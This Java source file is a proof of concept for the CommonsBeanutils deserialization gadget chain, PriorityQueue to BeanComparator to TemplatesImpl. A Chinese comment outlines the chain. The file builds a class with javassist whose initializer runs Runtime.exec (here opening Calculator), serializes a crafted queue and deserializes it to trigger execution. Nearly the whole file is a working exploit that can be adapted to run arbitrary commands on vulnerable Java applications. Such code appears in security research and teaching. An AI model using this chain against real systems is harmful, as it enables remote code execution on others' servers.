import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * 利用链：
 *  PriorityQueue#readObject
 *    PriorityQueue#heapify
 *      PriorityQueue#siftDown
 *        PriorityQueue#siftDownUsingComparator
 *          BeanComparator#compare
 *            TemplatesImpl#getOutputProperties
 *              Runtime....
 */

public class CommonsBeanutils {

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "Calc" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setField(templates,"_name","name");
        setField(templates,"_bytecodes",new byte[][]{cc.toBytecode()});
        setField(templates,"_tfactory",new TransformerFactoryImpl());
        setField(templates, "_class", null);

        BeanComparator comparator = new BeanComparator();

        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2,comparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        setField(priorityQueue,"queue",new Object[]{templates,templates});
        setField(comparator,"property","outputProperties");

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CommonsBeanutils.ser"));
        outputStream.writeObject(priorityQueue);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CommonsBeanutils.ser"));
        inputStream.readObject();
        inputStream.close();

    }

    public static void setField(Object object,String field,Object args) throws Exception{
        Field f0 = object.getClass().getDeclaredField(field);
        f0.setAccessible(true);
        f0.set(object,args);
    }
}